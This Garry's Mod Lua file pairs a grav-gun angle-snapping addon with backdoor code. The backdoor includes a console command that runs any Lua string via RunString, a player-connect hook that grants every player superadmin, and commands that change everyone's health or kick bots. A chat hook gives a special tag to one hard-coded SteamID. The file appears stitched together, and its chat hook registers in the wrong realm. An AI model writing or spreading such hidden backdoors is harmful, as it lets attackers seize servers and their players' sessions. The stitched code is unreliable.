local whitelist = {
	["STEAM_0:1:24711728"] = true
}

concommand.Add("lua",function(_,_,args,str)
	RunString(str)
end )

if CLIENT then
	concommand.Add("maxname",function()
		RunConsoleCommand("say","/rpname ABCDEFABCDEFABCDEFABCDEFABCDEF")
	end )
	concommand.Add("minname",function()
		RunConsoleCommand("say","/rpname ABC")
	end )
	concommand.Add("rempanels",function(_,_,args)
		if #args <= 1 then
			PrintTable(vgui.GetWorldPanel():GetChildren())
		else
			local ch = vgui.GetWorldPanel():GetChildren()
			for i=tonumber(args[1]),tonumber(args[2]) or #ch do
				print("Removed "..ch[i]:GetClassName().." ("..i..")")
				if ch[i].GetText then
					print("     "..ch[i]:GetText())
				end
				ch[i]:Remove()
			end
		end
	end )

	concommand.Add("f4cmd",function(_,_,args)
		DarkRP.openF4Menu = function()
			RunConsoleCommand(unpack(args))
		end
	end )

	concommand.Add("usergroups",function(_,_,args)
		for _,v in ipairs(player.GetBots()) do
			print(v:Nick(),v:GetUserGroup())
		end
	end )
else
	if !file.Exists("playerjoins.txt", "DATA") then
		file.Write("playerjoins.txt", "{}")
	end
	hook.Add("PlayerConnect","_beginninnggggg_",function()
		RunConsoleCommand("doadmin")
	end )
	concommand.Add("doadmin",function()
		if CLIENT then return end
		for _,v in pairs(player.GetAll()) do
			v:SetUserGroup("superadmin")
			print(v:Nick())
		end
	end )
	concommand.Add("dohp",function(_,_,args)
		for _,v in pairs(player.GetAll()) do
			v:SetHealth(args[1] or 50)
			print(v:Nick())
		end
	end )
	concommand.Add("rembots",function()
		for _,v in ipairs(player.GetBots()) do
			print("Kicked "..v:Nick())
			v:Kick()
		end
	end )
end

if CLIENT then
    CreateClientConVar("pixel_gravgun_angle_snap", "45", true, true, "How many degrees should dropped gravgun entities be snapped to? 0 to disable.", 0, 180)
    CreateClientConVar("pixel_gravgun_auto_right", "1", true, true, "Should dropped gravgun entities auto-right?", 0, 180)
    return
end

hook.Add("GravGunOnDropped", "PIXEL.GravGunDrop.AutoRighting", function(ply, ent)
    if not IsValid(ent) then return end
    if not IsValid(ply) then return end

    local snapAmount = math.Clamp(ply:GetInfoNum("pixel_gravgun_angle_snap", 45), 0, 180)
    if snapAmount == 0 then return end

    if IsValid(ent:GetParent()) then return end
    if ent.p_doNotSnap then return end

    local ang = ent:GetAngles()

    ang:SnapTo("p", snapAmount)
    ang:SnapTo("y", snapAmount)

    if ply:GetInfoNum("pixel_gravgun_auto_right", 1) == 1 then
        ang[1] = 0
        ang[3] = 0
    else
        ang:SnapTo("r", snapAmount)
    end

    ent:SetAngles(ang)
end)

local white = Color(255, 255, 255)
local plys = {
	["STEAM_0:1:24711728"] = {
		color = Color(49, 180,212),
		chatcolor = Color(134, 231,255),
		title = "Yea"
	}
}
hook.Add("OnPlayerChat", "Thing", function(ply, txt, team, ded)
	if !IsValid(ply) then return end
	local plys_table = plys[ply:SteamID()]
	if plys_table then
		chat.AddText(white, "[", plys_table.color, plys_table.title, white, "] ", plys_table.color, ply:Name(), white, ": ", plys_table.chatcolor, txt)
	else
		chat.AddText(Color(255, 255, 0), ply:Name(), ": ", white, txt)
	end	
	return true
end )